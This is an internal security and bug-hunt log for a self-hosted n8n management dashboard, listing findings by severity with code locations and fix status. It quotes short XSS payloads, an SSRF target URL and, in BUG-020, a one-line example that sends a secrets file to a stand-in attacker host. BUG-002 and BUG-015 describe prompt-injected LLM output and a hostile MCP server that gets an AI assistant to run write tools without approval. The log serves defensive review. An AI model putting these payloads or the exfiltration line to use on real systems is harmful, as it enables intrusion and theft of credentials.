# Full Bug Hunt, 2026-08-15

Comprehensive review of AgeniusDesk CE at the `feat/trace-backfill` tip (v0.5.0 plus trace-backfill Phase 1, instance rename/rotate, the s3 extra). Successor to the 2026-08-14 feature-QA pass, which walked only Observe; this pass covers the whole product.

**Method.** Ten parallel read-only static reviewers (one per module cluster plus a frontend split), a focused XSS verify-and-sweep pass, and a live Playwright walkthrough of every view on a throwaway instance driven against two stub n8n servers. Findings marked **[verified]** were independently re-read and confirmed by the lead before landing here; the rest are single-reviewer, grounded in a cited code path, and marked **[reported]**. Live-observed defects are marked **[live]** with the browser as proof.

**Policy for this pass: log only. No fixes.** Fixes get picked from this log in a later session.

**Re-grade 2026-08-16.** An adversarial re-review ([2026-08-15-full-bug-hunt-adversarial-review.md](2026-08-15-full-bug-hunt-adversarial-review.md)) was adjudicated against source; accepted re-grades are folded in below. BUG-004 and BUG-006 moved P1 to P2, BUG-014's verification label softened, fix-strategy notes added to S1 and BUG-002. Each carries a "Re-grade:" note. Rejected challenges (BUG-014 contract, BUG-009 impact) are documented in the review doc's adjudication.

## Remediation status (updated 2026-08-17)

Fixes landed on `feat/trace-backfill` per [2026-08-16-bug-hunt-remediation.md](../specs/2026-08-16-bug-hunt-remediation.md); per-phase outcome notes live there.

| Phase | Fixed in | Bugs closed |
|---|---|---|
| 1 — frontend XSS (S1) | `bf1e384` | S1 root cause, BUG-001, 002, 003, 060, 062 + the BUG-020 site table |
| 2 — backend security | `301e221` | BUG-008, 009, 015, 016, 018, 021, 031, 032, 040, 043 (043 mitigated, residual concurrency race logged) |
| 3 — fleet TLS (S2) | `565e99f` | S2 root cause, BUG-010, 025, 033 |
| 4 — backend correctness + P3 | `8fc033d` | BUG-004, 005, 006, 007, 012, 013, 014 (live-confirmed 2026-08-18), 017, 019, 022, 023, 024, 026, 027, 028, 029, 030, 034, 035, 036 (direction reversed: `awsApi` was the wrong side), 037 (detect-pattern fix, not the key migration), 038, 039, 041, 042, 044, 046, 047, 048, 049, 050, 051 |

Still open: Phase 5 (S3 / router cleanup plus BUG-053, 054, 056, 057, 058, 059, 061, 063) and the open decisions (BUG-020 module-worker isolation, 045, 052, 055). BUG-014's live capture completed 2026-08-18: the Error Trigger emits `workflow` top-level (no `execution.workflow` exists), fixture at `tests/fixtures/error_trigger_payload.json`.

## Severity legend

- **P1** broken feature, data loss, or security hole
- **P2** wrong behavior in realistic use
- **P3** minor, cosmetic, or self-only

## Counts

- P1: 4 (6 at first writing; BUG-004 and BUG-006 re-graded to P2 on 2026-08-16)
- P2: 17
- P3: 27
- Three systemic root causes (S1, S2, S3) account for 20+ of the individual sites below.

---

## Systemic root causes

These three underlie a large share of the findings. Fixing each once closes many sites at their root.

### S1. The default HTML escaper does not escape quotes [verified]

`esc(s)` is defined the same way in every view (`app.js:560` and clones): `el.textContent = s; return el.innerHTML`. The `textContent`→`innerHTML` round-trip runs the HTML **text-node** serializer, which encodes only `&`, `<`, `>` (and ` `), and **never `"` or `'`**. Its aliases `escHtml()`, `escapeHtml()`, `_esc()` share the flaw. Quote-safe helpers already exist in-repo and are used correctly elsewhere: `attr()`, `escAttr()`, `escapeAttr()`.

Consequence: every `attribute="${esc(x)}"` where `x` is attacker-influenced is an attribute-breakout XSS, and one `data-*` round-trip re-decodes `<`/`>` on read. n8n workflow names, node names, error text, instance names/URLs, container labels, and LLM/MCP output all reach these sinks. See BUG-001..003 (P1) and the site table in BUG-020.

Fix strategy (added 2026-08-16): do NOT patch `esc()` globally to escape quotes; that regresses its many legitimate text-node callers. Route attribute contexts to `attr()`/`escAttr()` site by site and leave `esc()` for text nodes. A blanket `esc()` change is the tempting fix and the wrong one.

### S2. TLS verification resolves from the active instance, not the target [verified]

At least seven call paths verify TLS using `_verify()` / `_tls_verify()` (the **active** instance's setting) while contacting a **different** instance. The correct helper `tls_verify_for_instance(inst)` exists and is used in the newer paths (`get_execution_raw_for`, `coverage.py`, backfill), so the same view disagrees with itself. On a mixed fleet (one self-signed instance, one strict) this makes Fleet Health, promote, credential mirror, and rotate misbehave, and in one direction POSTs decrypted secret plaintext with `verify=False`. See BUG-010 and its sub-sites.

### S3. The router never calls a view's cleanup(), so per-view timers and streams leak [verified]

`app.js` `navigate()` swaps views without invoking any view's exported `cleanup()`. Every view that starts a `setInterval`, `EventSource`, or WS subscription in `render()` and relies on `cleanup()` to tear it down leaks it on navigation and stacks a fresh one on return. Confirmed in `dashboard.js` (20s six-endpoint poll), `containers.js` (15s poll + log EventSource), `agent-fleet.js` (WS sub + 4s reconcile). The live walkthrough observed the dashboard poll cycle running continuously against the n8n instance while idle on unrelated views. See BUG-011.

---

## P1

### BUG-001 Stored XSS: workflow name executes on dashboard timeline hover [verified]
`frontend/js/views/dashboard.js:885,901-902`. `data-name="${esc(e.workflow_name)}"` is written escaped, but `block.dataset.name` decodes the entities back to raw markup on read, and line 902 interpolates it into `tooltip.innerHTML`. A workflow named `<img src=x onerror=alert(document.cookie)>` runs JS when its timeline block is hovered. Fix also requires re-escaping at the innerHTML read, not only the attribute write. (S1)

### BUG-002 Stored XSS: raw LLM reply into innerHTML in the workflow analyzer [verified]
`frontend/js/views/workflows.js:269-278`. `__analyzeExec` feeds `resp.response` through markdown regexes into `resultEl.innerHTML` with no `esc()` first. The prompt embeds attacker-influenced n8n error text (workflows.js:261), so a prompt-injected reply containing `<img src=x onerror=...>` executes. The sibling `errors.js:273` escapes first; this view does not. (S1) Fix note (2026-08-16): the markdown regexes themselves are the vector; their `$1` groups carry unescaped content into HTML context. Escape the full text FIRST, then run the formatting regexes over the escaped text (the errors.js pattern), or replace the markdown-lite pipeline with a real sanitizer. A naive esc()-last would break `<strong>`/`<code>` output.

### BUG-003 DOM XSS: Apple Music slug breaks out of the iframe src [verified]
`frontend/js/components/player.js:264-266` + regex `:37-38`. The Apple Music matcher captures the slug as `([^/]+)`, permitting `"`, `<`, `>`; `embedUrl` is interpolated into `<iframe src="${embedUrl}">` unescaped. A played/saved/vibe-queue URL like `music.apple.com/us/album/x"><img src=x onerror=alert(1)>/abc` injects live markup on render. (S1)

### BUG-005 Backfill precedence and preview use an instance-unscoped execution lookup [verified]
`backend/modules/observability/backfill.py:219,333` + `storage.trace_id_for_execution` (`storage.py:212`, `WHERE execution_id = ?`, no instance filter). n8n execution ids are small integers that collide across instances. On a multi-instance fleet, backfilling instance B's lost execution "123" matches instance A's real trace, so B is counted `skipped_traced` and never rebuilt, a silent hole in the exact recovery scenario the feature exists for; preview over-reports `already_traced` the same way. Single-instance fleets are unaffected.

---

## P2

### BUG-004 Health enrichment raises UnboundLocalError when run-data is unavailable [verified]
`backend/modules/observability/health.py:374` (`wf_data = (raw or {})...`). `raw` is assigned only inside the guarded fetch (`if exec_id and not inst.startswith("unknown-")` + `try`). When `exec_id` is empty, the instance is `unknown-<hash>`, or the fetch times out/raises (the common trigger: any slow or failed n8n round-trip), `raw` is never bound and line 374 raises. The span-only enrichment loop (health.py:321-366) has already run by then; its computed updates are discarded because the crash aborts before `set_health` at :397, so `checked_at` stays NULL and every retry re-crashes while the fetch keeps failing. The error is swallowed at debug by all callers. Re-grade 2026-08-16: P1 to P2. The dead-man's switch at :375 requires `wf_data.get("nodes")`, which only comes from `raw`, so that detector could not have run in these states anyway; the real loss is the discarded span-only results and the poisoned retry, wrong behavior rather than a fully broken feature.

### BUG-006 Manual workflow export truncates instances with more than 250 workflows [verified]
`backend/modules/n8n_proxy/client.py:1073` `export_all_workflows` fetches a single `limit=250` page with no cursor loop; it is wired to the manual import/export UI routes only. Scheduled fleet backups call the sibling `export_all_workflows_for` (:1084), which paginates correctly through n8n's cursor, so backups are complete. An instance with 300 workflows produces a 250-workflow manual export with no truncation warning. Re-grade 2026-08-16: P1 to P2; the original entry framed this as backup data loss, but no backup is produced from the non-paginated path. Note: `export_all_workflows_for` itself carries the S2 TLS defect at :1103 (`verify=_verify()`, active-instance resolution inside a per-instance fleet fan-out with no `use_instance()` override); that site is inventoried under BUG-010.

### BUG-007 Observe hides the rebuild path while the receiver is off, the exact outage state it is for [live]
`frontend/js/views/observability.js:88,96,185`. With `AGD_OTEL_ENABLED` unset, `/api/otel/status` returns `enabled:false` and the view short-circuits on `!status.enabled` before checking span count, so the setup panel renders with no trace list, no metrics, and no "Rebuild traces" action (that block is gated on `wired`, only true in the receiver-on-no-spans branch). The backend backfill works fully with the receiver off: direct calls returned `rebuildable:40`, then `40 backfilled / 160 spans / 0 errors`, and `/api/otel/traces` then served flagged traces. The recover UI is unreachable in precisely the state it was built for. (Self-inflicted on the new feature.)

### BUG-008 TOTP re-enroll silently disables 2FA and enables a step-up bypass [verified-adjacent]
`backend/modules/auth/service.py:513` via `POST /api/auth/totp/enroll`. Enroll unconditionally sets `enabled=False` and overwrites `secret_enc` with no guard against an already-2FA'd caller; login gates the second factor solely on `totp_enabled(user)`. (a) A 2FA user who opens "Set up authenticator" and closes it without activating has 2FA silently turned OFF. (b) A holder of a live session but not the password, who cannot use `/totp/disable` (needs password+code), can POST `/totp/enroll` to drop the account to 2FA-off, then rebind to their own device. Same-origin/session step-up bypass plus silent downgrade; CSRF-protected and self-scoped, so not cross-site.

### BUG-009 edit_instance (PUT) bypasses the SSRF floor and connection test [verified]
`backend/modules/n8n_proxy/router.py:166`. Unlike create, test-creds, and rotate-key, the instance-edit PUT calls neither `assert_safe_probe_url` nor a connection test. `PUT {"url":"http://169.254.169.254/latest", ...}` saves cleanly, and every later proxy call sends the stored `X-N8N-API-KEY` to that host, defeating the documented SSRF floor and leaking the instance API key to wherever the URL was repointed.

### BUG-010 TLS verified against the active instance while contacting a different one (S2) [verified]
Sites: `client.py:373` (`_instance_health`), `client.py:1103` (`export_all_workflows_for` TLS), `promote.py:66` (`_probe_instance`), `promote.py:138` (`_provision_credential`), `n8n_credentials/router.py:229,381` (mirror/unlink), `mappings.py:300` (`fetch_live_schemas`). Effects: Fleet Health shows a healthy self-signed instance as permanently unreachable; promote preflight blocks a self-signed target with a wrong "connection refused" diagnosis; and with an active instance at `tls_verify:false`, credential mirror/provision POST decrypted secret plaintext to a target with verification disabled. Fix by threading `tls_verify_for_instance(inst)` through all of them.

### BUG-011 Per-view timers and streams leak on navigation (S3) [verified]
Sites: `dashboard.js:167` (20s poll of six endpoints), `dashboard.js:852-861` (window mouse/resize listeners re-added per widget-grid rebuild, never removed), `containers.js:300,384` (15s poll), `containers.js:1148,1065,1592` (log/deploy `EventSource.onerror` nulls the handle without `.close()`, so the browser keeps reconnecting an unclosable stream), `agent-fleet.js:299-302`. Root cause is S3: `navigate()` never calls `cleanup()`. Observable as steady background load on the n8n instance and stacking handlers after a few navigations.

### BUG-012 Credential mirror deletes the old credential before the replacement succeeds [reported]
`backend/modules/n8n_credentials/router.py:279`. A re-mirror deletes the prior n8n credential before the create POST returns; a failed create (schema drift, wrong type, transient 400) destroys a working credential, breaks every target workflow bound to its id, and leaves `credential_mirrors.json` recording the dangling id that promote's reuse path will wire into future promotions.

### BUG-013 Promote reuses a prior mirror without checking credential type [reported]
`backend/modules/n8n_promote/promote.py:128`. `_provision_credential` returns a prior mirror for a secret without confirming its `credential_type` matches the requested type, and skips `_assert_provision_allowed`. Resolving an ambiguous row by picking a differently-typed existing secret binds the promoted workflow to a wrong-type credential that fails at runtime, the green-but-broken state the module exists to prevent; a since-tightened scope/URL guard is also not re-checked.

### BUG-014 Shipped error handler loses workflow attribution on every error [live-confirmed 2026-08-18]
`backend/n8n_workflows/global-error-handler.json` (Extract Error Details). The Code node reads `execution.workflow`, but n8n's documented Error Trigger contract emits `workflow` as a top-level sibling of `execution`, so it is always `{}`. Every pushed error is stored as `workflow_id:'unknown'` / `Unknown Workflow`; `get_errors_grouped` partitions by `(instance, workflow_id, node, type)`, so all workflows collapse into one `unknown` bucket, distinct workflows failing on the same node+type merge, and the Errors view cannot name the failing workflow. This is the recommended one-click install path. Message/node/execution_id are extracted correctly (their field paths match the documented shape exactly; only `workflow` is misnested), which supports contract bug over variant shape. Label softened 2026-08-16: confirm with a live n8n Error Trigger firing before fixing; dogfood would not have caught this because 3066's errors arrive via OTLP/execution polling, not this webhook.

### BUG-015 MCP tool classification fails open on server-controlled names [reported]
`backend/modules/assistant/mcp_client.py:385-389,415-417`. The `n8n-mcp` naming-convention profile classifies any non-`n8n_`-prefixed tool as read-only, and the profile is triggered by server-supplied tool names. A hostile or misconfigured MCP server that exposes two decoy read tools (to trip `detect_profile`) plus a write tool named without the `n8n_` prefix gets that write auto-executed with no approval card, contrary to the "unclassifiable fails closed" design of the v0.5.0 tool gate.

### BUG-016 MCP writes under autorun are never audited [reported]
`backend/modules/assistant/providers.py:84-86` + `mcp_client.execute_tool:424`. With `AGD_ASSISTANT_AUTORUN=true`, built-in writes still audit but `mcp_client.execute_tool` emits no `audit.record`, so an unattended MCP write (e.g. `n8n_delete_workflow`) leaves zero forensic trail in exactly the no-human-in-the-loop mode where the audit sink matters most. The 0.5.0 CHANGELOG promises this coverage.

### BUG-017 Agent-fleet single-flight guard is not atomic; runs and HITL approvals double-fire [reported]
`backend/modules/agent_fleet/router.py:194-208,212-220`. `is_live()`/`is_paused()` are checked in the router, but `_live_run_id` is set only inside the fire-and-forget task, with `create_run` in between. A double-clicked Run spawns two interleaved graph streams (the case `runner.py:60` says the guard prevents); a double-fired resume replays the human-in-the-loop approval twice against one parked checkpoint.

### BUG-018 Secret-name inventory reachable at operator via the MCP transport [reported]
`backend/modules/dashboard_mcp/server.py:162-179` vs `admin/router.py:32`. `GET /api/admin/secrets` is admin-only, but the MCP mount is gated at operator+, and the `list_secrets_metadata` MCP tool returns every stored secret's name, kind, and compound sub-field keys. An operator opens the Code Lab MCP terminal and reads an admin-only secret inventory one role lower via a different transport.

### BUG-019 Notes FTS search 500s on ordinary punctuation [reported]
`backend/modules/notes/index.py:253-264` consumed at `:154`. `_sanitize_query` forwards any query containing `"`, `(`, `)`, ` OR `, ` AND ` straight to FTS5 `MATCH`; an unbalanced token raises `sqlite3.OperationalError` that nothing catches. Typing `:)` or `"foo` into notes search returns HTTP 500 and breaks search for that input.

### BUG-020 Module-worker subprocess isolation does not enforce declared capabilities [reported]
`agd_module_worker/sandbox.py` + `backend/modules/_runtime/supervisor.py:118-137`. The `subprocess` isolation tier is a plain `Popen` with the host user's full network and filesystem rights; `capabilities.network.hosts` / `filesystem.write_paths` / `subprocess` / `docker` feed only the install-time AST scanner and the bridge-token scope, and are enforced only for bridge-mediated calls or the container tier. A community module declaring `network:{enabled:false}` can still `requests.get("http://attacker/?"+open('data/secrets.json').read())` under `AGD_MODULE_ISOLATION=subprocess`.

### BUG-021 Deleting the last user reopens unauthenticated owner creation [verified-adjacent]
`backend/modules/admin/router.py:111-119` (no last-admin/self guard) + `auth/router.py` `setup_owner` (refuses only when `accounts_exist()`), and `/api/auth/setup` is unauthenticated. Removing all users (self-delete allowed) drops `accounts_exist()` to false; the next unauthenticated visitor POSTs `/api/auth/setup` and is minted a fresh admin owner. The client (`admin.js:251`) also offers the delete with only a generic confirm and its own copy notes "without users, the dashboard is open access."

---

## P3

Grouped; each is real but minor, cosmetic, or self-only.

**Observability**
- BUG-022 [verified] Ingest precedence delete keyed on the mapped `unknown-<hash>` id never matches backfill rows stored under the real id, so backfilling an unwired instance then wiring export leaves a duplicate trace until retention. `ingest.py:184-188` + `instance_map.py:115-123`.
- BUG-023 [reported] TOCTOU between backfill's precedence check and its insert (30s fetch in between) can produce a permanent duplicate when a real trace lands mid-backfill. `backfill.py:219-229`.
- BUG-024 [reported] `get_trace` never returns `origin`, and the frontend never reads it, so a rebuilt trace renders identically to a captured one; the spec-§3 waterfall labeling is unimplemented. `storage.py:258-299`.
- BUG-025 [reported] `_probe_instance` builds its client without `verify=tls_verify_for_instance(inst)`, so a self-signed instance never pins its exporter hash and stays in the `unknown-<hash>` bucket forever. `instance_map.py:149`. (S2-adjacent)
- BUG-026 [reported] Deep-window backfill page budget (`cap//100 + 2`) is consumed by out-of-window rows, so a far-back window can return `scanned:0` with no error. `backfill.py:308-309`.
- BUG-027 [reported] Root span id collides with a child of any node literally named `workflow.execute`, silently dropping that node from the rebuild. `backfill.py:104,165`.
- BUG-028 [reported] An execution with empty `startedAt` yields `received_at=''` (COALESCE fallback never fires), which the next age-prune deletes. `backfill.py:57-62,145`.
- BUG-029 [reported] Each backfilled execution triggers up to three `includeData=true` fetches (synthesize + cost + health), tripling the load the caps were sized around. `backfill.py:222,230`.
- BUG-030 [verified] `AGD_OTEL_RETENTION_HOURS` code default is 72 while the spec reasons from 168; a >3-day gap is refused as `outside_retention`. `config.py:142` vs spec.

**Ingest / DoS**
- BUG-031 [verified] The request-size guard is Content-Length-only, so a `Transfer-Encoding: chunked` POST to the token-optional `/api/otel/v1/traces` skips it and `receive_traces` buffers `await request.body()` unbounded, a single-request memory-exhaustion vector. `main.py:398-408` + `router.py:38`.

**Auth**
- BUG-032 [verified] Login and `/forgot` are username/email enumeration timing oracles: the 600k-iteration PBKDF2 (and the DB write) run only when the account exists. `auth/router.py:166`.

**Proxy / promote / credentials (mostly S2 fallout or edge cases)**
- BUG-033 [reported] `test_connection_with(verify=None)` falls back to the active instance's per-instance TLS rather than the global default; rotate-key can be wrongly rejected. `client.py:302`. (S2)
- BUG-034 [reported] `update_instance` blank-keeps-existing on `login_url` collides with `edit_instance`'s computed blank, leaving a stale login URL after a repoint; and a blank `url`/`name` in the same PUT is stored rather than kept, bricking the instance. `config.py:944`.
- BUG-035 [reported] `unlink_mirror` does a read-modify-write of `credential_mirrors.json` outside `_MIRRORS_LOCK`, the race the lock was added to fix. `n8n_credentials/router.py:393`.
- BUG-036 [reported] AWS is registered as `awsApi` but the compound template is keyed `aws`, so the two never meet and the template is dead code. `known_types.py:62` vs `mappings.py:105`.
- BUG-037 [reported] Migration names the OpenAI key `OPEN_AI_KEY`, which the `openAiApi` auto-detect substring `OPENAI` can never match. `config.py:764`.
- BUG-038 [reported] `client._get` swallows HTTP status errors to `{}`, so a mid-batch promote source failure is reported as "Not found on source." `promote.py:499` + `client.py:105`.
- BUG-039 [reported] `get_active_instance()` falls back to `instances[0]` on a stale id while `get_active_instance_id()` keeps the stale id, so id-scoped features (Observe, silent flags) disagree with the client's actual target. `config.py:314`.

**Assistant / knowledge**
- BUG-040 [reported] Both tool loops log `json.dumps(args)[:100]` unscrubbed at INFO, so a secret passed as a tool argument reaches the plain log. `providers.py:857,1109`.
- BUG-041 [reported] `/api/knowledge/search` forwards `limit` to Qdrant with no ceiling (the rag.py path caps at 5). `knowledge/router.py:115`.
- BUG-042 [reported] A partial `PUT /sources/{id}` including `config` replaces the whole `config_json`, dropping sibling keys, inconsistent with the top-level merge. `knowledge/storage.py:72-74`.

**Fleet / MCP**
- BUG-043 [reported] `_run_pydantic` writes the resolved Anthropic key into `os.environ` permanently, broadening a secret-store-only key's exposure. `agent_fleet/runner.py:441`.
- BUG-044 [reported] `delete_run` ignores `_PAUSED`, so deleting a parked run leaks its in-memory graph and leaves `is_paused()` true for a gone row. `agent_fleet/router.py:240-247`.
- BUG-045 [reported] The lifespan drives `mcp.session_manager.run()`, a FastMCP-1.x attribute the dual-SDK shim does not abstract; under mcp 2.0 the try/except swallows it to None and the session task group never starts (latent while mcp<2.0 is pinned). `main.py:66-70`.

**Docker / backups / notes**
- BUG-046 [reported] `recreate_bundle`'s early-error returns never `release(deploy_id)`, leaking `_queues` entries. `docker_mgr/deployer.py:487-503`.
- BUG-047 [reported] The backup traversal guard resolves `base` from the caller-supplied `instance_id`, so it cannot catch an `instance_id` that walks out of `BACKUPS_DIR`; bounded by the strict stamp regex and operator gating. `backups/service.py:247-258`.
- BUG-048 [reported] `notes.append` is an un-serialized read-modify-write, so concurrent agent-scratchpad appends lose data. `notes/storage.py:197-204`.
- BUG-049 [reported] The self-container destruction guard fails open when the container id cannot be resolved, permitting an operator to destroy the dashboard's own container. `docker_mgr/client.py:265-316`.

**Errors / insights / scheduler**
- BUG-050 [verified] `scheduler.py:131` calls `enabled_fn()`/`interval_fn()` outside the per-tick try/except, so one raise (e.g. corrupt config.json) kills all scheduled jobs permanently. `scheduler.py:131`.
- BUG-051 [reported] `insights` `_fetch_executions` ignores its `instance_id` and always queries the active instance while errors use the requested instance; latent because the UI only sends `range`. `insights/aggregator.py:67-99`.
- BUG-052 [reported] `errors` and `messages` tables have no retention or prune anywhere; `health_checks` is created but never written. `errors/collector.py`, `messages/collector.py`.

**Frontend (S1 sites and misc)**
- BUG-020-sites [verified] Additional S1 attribute-breakout sites: `assistant.js:932` (markdown-link href from LLM output, P2), `containers.js` label/name/url via quote-blind `escHtml()` (P2/P3), `agent-fleet.js` id/label/HITL choice, `app.js:602` instance name, `fleet-health.js:58`/`dashboard.js:614`/`connect-n8n-guide.js` instance URLs, `secrets.js` secret name/instance id, `dashboard.js:1102` unescaped n8n ids, `music.js` self-set config (self-only).
- BUG-053 [live] Admin add-user `pattern="[a-zA-Z0-9_-]+"` throws under Chromium's `v`-flag regex, disabling that field's client validation (server still validates). `admin.js:173`.
- BUG-054 [live] Viewer role sees the full Admin view and its privileged forms; the client never hides admin UI (server writes correctly 403). Defense-in-depth/misleading-UI gap.
- BUG-055 [live] Viewer role is 403-blocked from `GET /api/n8n/instances` and `/workflows`, surfacing raw "Failed to load: Insufficient role" instead of a read view; either over-gated for read-only or needs a permission empty-state.
- BUG-056 [live] Executions/Errors Flat view labels an error's instance "unknown" while Grouped resolves the same id to its name.
- BUG-057 [live] Settings › Themes cards don't reflect a theme changed via the sidebar dropdown (Dark card stays highlighted while Light/n8n is active).
- BUG-058 [reported] `settings-modules.js:132-139` calls `r.startsWith('$')` on `/api/admin/secrets/refs` entries that are objects `{name,ref,hint}`, so the map throws, the catch swallows it, and every declared secret shows a false "missing" ✗.
- BUG-059 [reported] `codelab.js:1337` builds the Apply button with `btoa(codeMatch[1])`, which throws on any char > 255 (emoji, smart quote), dropping both the Apply button and the approval card at `:1346`.
- BUG-060 [reported] `workflows.js:274` / `errors.js:281` Copy button's inline `onclick` is broken by `JSON.stringify`'s double quotes closing the attribute; the `.replace` only handles single quotes, so Copy does nothing.
- BUG-061 [live] Inputs lack `autocomplete`/form containment, so the browser autofills the saved owner email/password into unrelated fields including Rotate-key and Add-Secret; console warns repeatedly. Cosmetic but on credential surfaces.
- BUG-062 [reported] `admin.js:306,317` `infoRow('n8n URL', status.n8n_url)` interpolates the value into `<span>` raw (self-XSS, admin-only).
- BUG-063 [reported] Onboarding n8n API-key SecretField has no input→state binding, so a key typed last is lost on Back-then-forward navigation. `wizard.js:1131-1140`.

---

## Non-code / environment

- **Stale `agent-fleet` community dir** [verified]. The recurring startup warning `agent-fleet has no valid manifest.json` is not a code bug. The built-in `agent_fleet` (underscore) manifest is valid; the warning comes from `_register_community` (`__init__.py:130`) finding a leftover `data/modules/agent-fleet/` (hyphen) dir on the dogfood volume, the pre-2026-06-28 community module that was migrated into core, whose manifest is now absent. Fix is removing that directory on the volume, not a code change.

---

## Verification notes

Independently re-read and confirmed by the lead: S1 (esc() quote-blindness and the full sweep), S2 (active-instance TLS), S3 (cleanup never called), BUG-001/002/003 (XSS), BUG-004 (health UnboundLocal), BUG-005 (unscoped trace lookup), BUG-006 (export truncation), BUG-009 (edit_instance SSRF), BUG-014 (error-handler attribution), BUG-030 (retention default), BUG-031 (chunked body bypass), BUG-050 (scheduler tick). BUG-008 and BUG-021 were confirmed against the surrounding request paths but not exploited. A second adjudication pass on 2026-08-16 (prompted by the adversarial re-review) re-confirmed BUG-004/006/009/014 against source and produced the re-grades noted inline.

Areas reviewers checked and found sound (not exhaustive): session handling, password-reset tokens, public-API scoping/expiry/rate-limit, the assistant approval gate across all six chat surfaces and both provider loops, `_dispatch_tool` single-use/TTL, the module-installer tar validation, the player server-side embed sanitizer, docker env/name/image building, theme id traversal, the OTLP token compare (`hmac.compare_digest`) and attribute cap, and the observability backfill WS wiring and idempotency.

## Views covered

| View | Walked | Result |
| --- | --- | --- |
| Overview | yes (live) | OK; polling/cleanup leak (BUG-011), timeline/health XSS (BUG-001) |
| Workflows | yes (live) | OK; analyzer XSS (BUG-002), Copy button (BUG-060) |
| Executions / Errors | yes (live) | Flat instance "unknown" (BUG-056); error-handler attribution (BUG-014) |
| Promote | yes (live) | OK end to end; cred-type reuse (BUG-013), TLS (BUG-010) |
| Observe | yes (live) | Rebuild unreachable while receiver off (BUG-007); backfill P1 (BUG-005) |
| Insights | yes (live) | OK; instance-id mixing latent (BUG-051) |
| Fleet Health | yes (live) | OK; self-signed TLS mislabel (BUG-010) |
| Agent Fleet | yes (static) | hidden without langgraph extra; run/HITL races (BUG-017) |
| Instances | yes (live) | rename/rotate OK, coverage pill OK; edit-PUT SSRF (BUG-009) |
| Containers | yes (live) | OK (Docker present); poll/stream leaks (BUG-011), label XSS (BUG-020) |
| Code Lab | yes (live) | OK; Apply btoa (BUG-059), MCP secret-name leak (BUG-018) |
| Harness / Knowledge | yes (live) | OK; search cap (BUG-041), config clobber (BUG-042) |
| Models | yes (live) | OK (unconfigured empty state) |
| MCP | yes (live) | OK; classification fail-open (BUG-015) |
| Secrets | yes (live) | CRUD OK; name attribute XSS (BUG-020) |
| Assistant | yes (static) | tool gate sound; autorun audit gap (BUG-016), link href (BUG-020) |
| Notes | yes (static) | search 500 (BUG-019), append race (BUG-048) |
| Admin | yes (live) | server RBAC solid; last-user (BUG-021), viewer UI (BUG-054), pattern (BUG-053) |
| Settings | yes (live) | theme cards (BUG-057), modules refs ✗ (BUG-058) |
| Import / Export / Backup | yes (live) | Backup OK (paginates); manual export >250 truncation (BUG-006) |
| Themes | yes (live) | readable in all three; card sync (BUG-057) |
| Player / Music | yes (live) | opens; slug XSS (BUG-003), self-config (BUG-020) |

Every view walked. No `no` rows remain.
